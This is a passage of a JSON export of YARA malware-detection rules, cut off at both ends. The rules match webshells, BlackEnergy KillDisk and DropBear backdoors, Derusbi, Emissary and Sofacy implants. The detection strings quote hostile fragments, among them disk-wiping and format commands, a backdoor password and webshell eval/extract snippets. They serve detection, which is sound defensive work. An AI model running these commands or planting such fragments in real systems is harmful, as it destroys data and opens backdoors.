color=red size=3>Error:</font> Can't backdoor host!</b>\\\";\" fullword ascii\n   condition: \n      filesize < 1711KB and 1 of them\n}","date":"2016-01-11 13:45:31","description":"Detects Webshell - rule generated from from files 27.9.txt, acid.php, c99_locus7s.txt","minimum_yara":"1.7","name":"Webshell_27_9_acid_c99_locus7s_RID31FA","reference":"https://github.com/nikicat/web-malware-collection","required_modules":[],"rule_hash":"83ff295cb22da8538bbcde7d14ae1d95","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_27_9_c66_c99_RID2E09 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php, c993.txt ...\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 10:57:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"if (!empty($unset_surl)) {setcookie(\\\"c99sh_surl\\\"); $surl = \\\"\\\";}\" fullword ascii\n      $s6 = \"@extract($_REQUEST[\\\"c99shcook\\\"]);\" fullword ascii\n      $s7 = \"if (!function_exists(\\\"c99_buff_prepare\\\"))\" fullword ascii\n   condition: \n      filesize < 685KB and 1 of them\n}","date":"2016-01-11 10:57:21","description":"Detects Webshell - rule generated from from files 27.9.txt, c66.php, c99-shadows-mod.php, c99.php, c993.txt ...","minimum_yara":"1.7","name":"Webshell_27_9_c66_c99_RID2E09","reference":"https://github.com/nikicat/web-malware-collection","required_modules":[],"rule_hash":"0c3be143afdee2b992461429e58f6820","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Ayyildiz_RID2DF5 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Webshell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 10:54:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"<option value=\\\\\\\"\\\". strrev(substr(strstr(strrev($work_dir), \\\"/\\\"), 1)) .\\\"\\\\\\\">Parent Directory</option>\\\\n\\\";\" fullword ascii\n      $s1 = \"echo \\\"<option value=\\\\\\\"$work_dir\\\\\\\" selected>Current Directory</option>\\\\n\\\";\" fullword ascii\n   condition: \n      filesize < 112KB and all of them\n}","date":"2016-01-11 10:54:01","description":"Detects Webshell","minimum_yara":"1.7","name":"Webshell_Ayyildiz_RID2DF5","reference":"https://github.com/nikicat/web-malware-collection","required_modules":[],"rule_hash":"a9368b48de4848ebf5c512cc51a7e3b2","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_acid_FaTaLisTiCz_Fx_fx_p0isoN_sh3ll_x0rg_byp4ss_256_RID3D6B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files acid.php, FaTaLisTiCz_Fx.txt, fx.txt, p0isoN.sh3ll.txt, x0rg.byp4ss.txt\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 21:53:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<form method=\\\"POST\\\"><input type=hidden name=act value=\\\"ls\\\">\" fullword ascii\n      $s2 = \"foreach($quicklaunch2 as $item) {\" fullword ascii\n   condition: \n      filesize < 882KB and all of them\n}","date":"2016-01-11 21:53:41","description":"Detects Webshell - rule generated from from files acid.php, FaTaLisTiCz_Fx.txt, fx.txt, p0isoN.sh3ll.txt, x0rg.byp4ss.txt","minimum_yara":"1.7","name":"Webshell_acid_FaTaLisTiCz_Fx_fx_p0isoN_sh3ll_x0rg_byp4ss_256_RID3D6B","reference":"https://github.com/nikicat/web-malware-collection","required_modules":[],"rule_hash":"b8e9068c00ffac2c32bd171a1c7ecd94","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_acid_AntiSecShell_3_RID31C7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Webshell Acid\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 13:37:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"<option value=delete\\\".($dspact == \\\"delete\\\"?\\\" selected\\\":\\\"\\\").\\\">Delete</option>\\\";\" fullword ascii\n      $s1 = \"if (!is_readable($o)) {return \\\"<font color=red>\\\".view_perms(fileperms($o)).\\\"</font>\\\";}\" fullword ascii\n   condition: \n      filesize < 900KB and all of them\n}","date":"2016-01-11 13:37:01","description":"Detects Webshell Acid","minimum_yara":"1.7","name":"Webshell_acid_AntiSecShell_3_RID31C7","reference":"https://github.com/nikicat/web-malware-collection","required_modules":[],"rule_hash":"cd5447c88da4b263e1db8d155496e652","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_zehir_RID2CC8 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 10:03:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"for (i=1; i<=frmUpload.max.value; i++) str+='File '+i+': <input type=file name=file'+i+'><br>';\" fullword ascii\n      $s2 = \"if (frmUpload.max.value<=0) frmUpload.max.value=1;\" fullword ascii\n   condition: \n      filesize < 200KB and 1 of them\n}","date":"2016-01-11 10:03:51","description":"Detects Webshell - rule generated from from files elmaliseker.asp, zehir.asp, zehir.txt, zehir4.asp, zehir4.txt","minimum_yara":"1.7","name":"Webshell_zehir_RID2CC8","reference":"https://github.com/nikicat/web-malware-collection","required_modules":[],"rule_hash":"e5852688ee73f2d29ad5af86b3bca3f2","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99_4_RID2C0E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Detects C99 Webshell\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/nikicat/web-malware-collection\"\n      date = \"2016-01-11 09:32:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"displaysecinfo(\\\"List of Attributes\\\",myshellexec(\\\"lsattr -a\\\"));\" fullword ascii\n      $s2 = \"displaysecinfo(\\\"RAM\\\",myshellexec(\\\"free -m\\\"));\" fullword ascii\n      $s3 = \"displaysecinfo(\\\"Where is perl?\\\",myshellexec(\\\"whereis perl\\\"));\" fullword ascii\n      $s4 = \"$ret = myshellexec($handler);\" fullword ascii\n      $s5 = \"if (posix_kill($pid,$sig)) {echo \\\"OK.\\\";}\" fullword ascii\n   condition: \n      filesize < 900KB and 1 of them\n}","date":"2016-01-11 09:32:51","description":"Detects C99 Webshell","minimum_yara":"1.7","name":"Webshell_c99_4_RID2C0E","reference":"https://github.com/nikicat/web-malware-collection","required_modules":[],"rule_hash":"0c5e4c8fdd2b7d0feb92a9d49d34b479","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule BlackEnergy_Driver_USBMDM_RID304A : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule\"\n      author = \"Florian Roth\"\n      reference = \"http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/\"\n      date = \"2016-01-04 12:33:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"USB MDM Driver\" fullword wide\n      $s2 = \"KdDebuggerNotPresent\" fullword ascii\n      $s3 = \"KdDebuggerEnabled\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them\n}","date":"2016-01-04 12:33:31","description":"Semiautomatic generated rule","minimum_yara":"1.7","name":"BlackEnergy_Driver_USBMDM_RID304A","reference":"http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/","required_modules":[],"rule_hash":"8105b175ff7021c6bfd299865035b4b8","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule BlackEnergy_Driver_AMDIDE_RID3026 : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatic generated rule\"\n      author = \"Florian Roth\"\n      reference = \"http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/\"\n      date = \"2016-01-04 12:27:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \" AMD IDE driver\" fullword wide\n      $s2 = \"SessionEnv\" fullword wide\n      $s3 = \"\\\\DosDevices\\\\{C9059FFF-1C49-4445-83E8-\" wide\n      $s4 = \"\\\\Device\\\\{C9059FFF-1C49-4445-83E8-\" wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and all of them\n}","date":"2016-01-04 12:27:31","description":"Semiautomatic generated rule","minimum_yara":"1.7","name":"BlackEnergy_Driver_AMDIDE_RID3026","reference":"http://www.welivesecurity.com/2016/01/03/blackenergy-sshbeardoor-details-2015-attacks-ukrainian-news-media-electric-industry/","required_modules":[],"rule_hash":"66749239f5e86e51ba5642ffcc860ace","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule BlackEnergy_VBS_Agent_RID2EF0 : APT DEMO SCRIPT T1021 {\n   meta:\n      description = \"Detects VBS Agent from BlackEnergy Report - file Dropbearrun.vbs\"\n      author = \"Florian Roth\"\n      reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n      date = \"2016-01-03 11:35:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, SCRIPT, T1021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"WshShell.Run \\\"dropbear.exe -r rsa -d dss -a -p 6789\\\", 0, false\" fullword ascii\n      $s1 = \"WshShell.CurrentDirectory = \\\"C:\\\\WINDOWS\\\\TEMP\\\\Dropbear\\\\\\\"\" fullword ascii\n      $s2 = \"Set WshShell = CreateObject(\\\"WScript.Shell\\\")\" fullword ascii\n   condition: \n      filesize < 1KB and 2 of them\n}","date":"2016-01-03 11:35:51","description":"Detects VBS Agent from BlackEnergy Report - file Dropbearrun.vbs","minimum_yara":"1.7","name":"BlackEnergy_VBS_Agent_RID2EF0","reference":"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/","required_modules":[],"rule_hash":"4e0812bd7c3d633c684786bac9a93078","score":75,"tags":["APT","DEMO","SCRIPT","T1021"]},{"author":"Florian Roth","content":"rule DropBear_SSH_Server_RID2E43 : APT DEMO EXE FILE RUSSIA T1021 {\n   meta:\n      description = \"Detects DropBear SSH Server (not a threat but used to maintain access)\"\n      author = \"Florian Roth\"\n      reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n      date = \"2016-01-03 11:07:01\"\n      score = 50\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, RUSSIA, T1021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Dropbear server v%s https://matt.ucc.asn.au/dropbear/dropbear.html\" fullword ascii\n      $s2 = \"Badly formatted command= authorized_keys option\" fullword ascii\n      $s3 = \"This Dropbear program does not support '%s' %s algorithm\" fullword ascii\n      $s4 = \"/etc/dropbear/dropbear_dss_host_key\" fullword ascii\n      $s5 = \"/etc/dropbear/dropbear_rsa_host_key\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them\n}","date":"2016-01-03 11:07:01","description":"Detects DropBear SSH Server (not a threat but used to maintain access)","minimum_yara":"1.7","name":"DropBear_SSH_Server_RID2E43","reference":"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/","required_modules":[],"rule_hash":"c5d92dd2239d05b6ab8544cfa0f093f8","score":50,"tags":["T1021","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule BlackEnergy_BackdoorPass_DropBear_SSH_RID352E : APT DEMO EXE FILE MAL RUSSIA T1021 {\n   meta:\n      description = \"Detects the password of the backdoored DropBear SSH Server - BlackEnergy\"\n      author = \"Florian Roth\"\n      reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n      date = \"2016-01-03 16:02:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, RUSSIA, T1021\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"passDs5Bu9Te7\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and $s1\n}","date":"2016-01-03 16:02:11","description":"Detects the password of the backdoored DropBear SSH Server - BlackEnergy","minimum_yara":"1.7","name":"BlackEnergy_BackdoorPass_DropBear_SSH_RID352E","reference":"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/","required_modules":[],"rule_hash":"9006c661b82b57c4b78be4d572bd23cc","score":75,"tags":["T1021","MAL","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule BlackEnergy_KillDisk_1_RID2F5E : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects KillDisk malware from BlackEnergy\"\n      author = \"Florian Roth\"\n      reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n      date = \"2016-01-03 11:54:11\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"system32\\\\cmd.exe\" fullword ascii\n      $s1 = \"system32\\\\icacls.exe\" fullword wide\n      $s2 = \"/c del /F /S /Q %c:\\\\*.*\" fullword ascii\n      $s3 = \"shutdown /r /t %d\" fullword ascii\n      $s4 = \"/C /Q /grant \" fullword wide\n      $s5 = \"%08X.tmp\" fullword ascii\n      $s6 = \"/c format %c: /Y /X /FS:NTFS\" fullword ascii\n      $s7 = \"/c format %c: /Y /Q\" fullword ascii\n      $s8 = \"taskhost.exe\" fullword wide\n      $s9 = \"shutdown.exe\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 8 of them\n}","date":"2016-01-03 11:54:11","description":"Detects KillDisk malware from BlackEnergy","minimum_yara":"1.7","name":"BlackEnergy_KillDisk_1_RID2F5E","reference":"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/","required_modules":[],"rule_hash":"0f82d70aa823c7979fff6fdae63ab257","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule BlackEnergy_KillDisk_2_RID2F5F : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects KillDisk malware from BlackEnergy\"\n      author = \"Florian Roth\"\n      reference = \"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/\"\n      date = \"2016-01-03 11:54:21\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%c:\\\\~tmp%08X.tmp\" fullword ascii\n      $s1 = \"%s%08X.tmp\" fullword ascii\n      $s2 = \".exe.sys.drv.doc.docx.xls.xlsx.mdb.ppt.pptx.xml.jpg.jpeg.ini.inf.ttf\" fullword wide\n      $s3 = \"%ls_%ls_%ls_%d.~tmp\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and 3 of them\n}","date":"2016-01-03 11:54:21","description":"Detects KillDisk malware from BlackEnergy","minimum_yara":"1.7","name":"BlackEnergy_KillDisk_2_RID2F5F","reference":"http://feedproxy.google.com/~r/eset/blog/~3/BXJbnGSvEFc/","required_modules":[],"rule_hash":"3540a51991bc17152f1e5df9d98bb070","score":80,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule Emissary_APT_Malware_1_RID2F5A : APT DEMO EXE FILE MAL T1085 {\n   meta:\n      description = \"Detect Emissary Malware - from samples A08E81B411.DAT, ishelp.dll\"\n      author = \"Florian Roth\"\n      reference = \"http://goo.gl/V0epcf\"\n      date = \"2016-01-02 11:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"cmd.exe /c %s > %s\" fullword ascii\n      $s2 = \"execute cmd timeout.\" fullword ascii\n      $s3 = \"rundll32.exe \\\"%s\\\",Setting\" fullword ascii\n      $s4 = \"DownloadFile - exception:%s.\" fullword ascii\n      $s5 = \"CDllApp::InitInstance() - Evnet create successful.\" fullword ascii\n      $s6 = \"UploadFile - EncryptBuffer Error\" fullword ascii\n      $s7 = \"WinDLL.dll\" fullword wide\n      $s8 = \"DownloadFile - exception:%s,code:0x%08x.\" fullword ascii\n      $s9 = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)\" fullword ascii\n      $s10 = \"CDllApp::InitInstance() - Evnet already exists.\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and 3 of them\n}","date":"2016-01-02 11:53:31","description":"Detect Emissary Malware - from samples A08E81B411.DAT, ishelp.dll","minimum_yara":"1.7","name":"Emissary_APT_Malware_1_RID2F5A","reference":"http://goo.gl/V0epcf","required_modules":[],"rule_hash":"6d7ed0cef7d27fe0c21b39c84e1cf2a5","score":75,"tags":["MAL","DEMO","FILE","APT","T1085","EXE"]},{"author":"Florian Roth","content":"rule WebShell_PHP_Web_Kit_v3_RID2F7A : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects PAS Tool PHP Web Kit\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/wordfence/grizzly\"\n      date = \"2016-01-01 11:58:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $php = \"<?php $\" \n      $php2 = \"@assert(base64_decode($_REQUEST[\" \n      $s1 = \"(str_replace(\\\"\\\\n\\\", '', '\" \n      $s2 = \"(strrev($\" ascii\n      $s3 = \"de'.'code';\" ascii\n   condition: \n      ( ( uint32 ( 0 ) == 0x68703f3c and $php at 0 ) or $php2 ) and filesize > 8KB and filesize < 100KB and all of ( $s* )\n}","date":"2016-01-01 11:58:51","description":"Detects PAS Tool PHP Web Kit","minimum_yara":"1.7","name":"WebShell_PHP_Web_Kit_v3_RID2F7A","reference":"https://github.com/wordfence/grizzly","required_modules":[],"rule_hash":"cc88ada76efa2268f305a9f588c12a51","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule WebShell_PHP_Web_Kit_v4_RID2F7B : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Detects PAS Tool PHP Web Kit\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/wordfence/grizzly\"\n      date = \"2016-01-01 11:59:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $php = \"<?php $\" \n      $s1 = \"(StR_ReplAcE(\\\"\\\\n\\\",'',\" \n      $s2 = \";if(PHP_VERSION<'5'){\" ascii\n      $s3 = \"=SuBstr_rePlACe(\" ascii\n   condition: \n      uint32 ( 0 ) == 0x68703f3c and $php at 0 and filesize > 8KB and filesize < 100KB and 2 of ( $s* )\n}","date":"2016-01-01 11:59:01","description":"Detects PAS Tool PHP Web Kit","minimum_yara":"1.7","name":"WebShell_PHP_Web_Kit_v4_RID2F7B","reference":"https://github.com/wordfence/grizzly","required_modules":[],"rule_hash":"a86d493242c2dfe7d87fb09bdc9c4ae3","score":75,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule Derusbi_Kernel_Driver_WD_UDFS_RID31F5 : APT DEMO EXE FILE T1014 T1050 {\n   meta:\n      description = \"Detects Derusbi Kernel Driver\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n      date = \"2015-12-15 13:44:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1014, T1050\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\\\\\.\\\\pipe\\\\usbpcex%d\" fullword wide\n      $x2 = \"\\\\\\\\.\\\\pipe\\\\usbpcg%d\" fullword wide\n      $x3 = \"\\\\??\\\\pipe\\\\usbpcex%d\" fullword wide\n      $x4 = \"\\\\??\\\\pipe\\\\usbpcg%d\" fullword wide\n      $x5 = \"$$$--Hello\" fullword ascii\n      $x6 = \"Wrod--$$$\" fullword ascii\n      $s1 = \"\\\\Registry\\\\User\\\\%s\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\" fullword wide\n      $s2 = \"Update.dll\" fullword ascii\n      $s3 = \"\\\\Registry\\\\Machine\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\" fullword wide\n      $s4 = \"\\\\Driver\\\\nsiproxy\" fullword wide\n      $s5 = \"HOST: %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( 2 of ( $x* ) or all of ( $s* ) )\n}","date":"2015-12-15 13:44:41","description":"Detects Derusbi Kernel Driver","minimum_yara":"1.7","name":"Derusbi_Kernel_Driver_WD_UDFS_RID31F5","reference":"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family","required_modules":[],"rule_hash":"3cad4591c7165b723bd639e657ab52aa","score":80,"tags":["T1014","T1050","DEMO","FILE","APT","EXE"]},{"author":"Florian Roth","content":"rule Derusbi_Code_Signing_Cert_RID30D4 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects an executable signed with a certificate also used for Derusbi Trojan - suspicious\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n      date = \"2015-12-15 12:56:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Fuqing Dawu Technology Co.,Ltd.0\" fullword ascii\n      $s2 = \"XL Games Co.,Ltd.0\" fullword ascii\n      $s3 = \"Wemade Entertainment co.,Ltd0\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and 1 of them\n}","date":"2015-12-15 12:56:31","description":"Detects an executable signed with a certificate also used for Derusbi Trojan - suspicious","minimum_yara":"1.7","name":"Derusbi_Code_Signing_Cert_RID30D4","reference":"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family","required_modules":[],"rule_hash":"6825d00a1f11e7fdaab6f6b4f9a49ae9","score":60,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule XOR_4byte_Key_RID2BD9 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects an executable encrypted with a 4 byte XOR (also used for Derusbi Trojan)\"\n      author = \"Florian Roth\"\n      reference = \"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family\"\n      date = \"2015-12-15 09:24:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = { 85 C9 74 0A 31 06 01 1E 83 C6 04 49 EB F2 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and all of them\n}","date":"2015-12-15 09:24:01","description":"Detects an executable encrypted with a 4 byte XOR (also used for Derusbi Trojan)","minimum_yara":"1.7","name":"XOR_4byte_Key_RID2BD9","reference":"http://blog.airbuscybersecurity.com/post/2015/11/Newcomers-in-the-Derusbi-family","required_modules":[],"rule_hash":"803a44769d6e517b4e83b320955fe96f","score":60,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Sofacy_Malware_StrangeSpaces_RID3230 : APT DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"Detetcs strange strings from Sofacy malware with many spaces\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 13:54:31\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"Delete Temp Folder Service                                  \" fullword wide\n      $s3 = \" Operating System                        \" fullword wide\n      $s4 = \"Microsoft Corporation                                       \" fullword wide\n      $s5 = \" Microsoft Corporation. All rights reserved.               \" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 3 of them\n}","date":"2015-12-04 13:54:31","description":"Detetcs strange strings from Sofacy malware with many spaces","minimum_yara":"1.7","name":"Sofacy_Malware_StrangeSpaces_RID3230","reference":"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/","required_modules":[],"rule_hash":"f38dd724ab6dbd70680a55fac6b8a3d2","score":60,"tags":["MAL","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule Sofacy_Malware_AZZY_Backdoor_1_RID325F : APT DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"AZZY Backdoor - Sample 1\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 14:02:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"advstorshell.dll\" fullword wide\n      $s1 = \"advshellstore.dll\" fullword ascii\n      $s2 = \"Windows Advanced Storage Shell Extension DLL\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 150KB and 2 of them\n}","date":"2015-12-04 14:02:21","description":"AZZY Backdoor - Sample 1","minimum_yara":"1.7","name":"Sofacy_Malware_AZZY_Backdoor_1_RID325F","reference":"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/","required_modules":[],"rule_hash":"c48ef6d314d2b34d736a1c5cba5e08a5","score":75,"tags":["MAL","DEMO","FILE","APT","RUSSIA","EXE"]},{"author":"Florian Roth","content":"rule Sofacy_AZZY_Backdoor_Implant_1_RID326B : APT DEMO EXE FILE MAL RUSSIA {\n   meta:\n      description = \"AZZY Backdoor Implant 4.3 - Sample 1\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/72924/sofacy-apt-hits-high-profile-targets-with-updated-toolset/\"\n      date = \"2015-12-04 14:04:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL, RUSSIA\"\n      minimum_yara = \"1.7\"\n      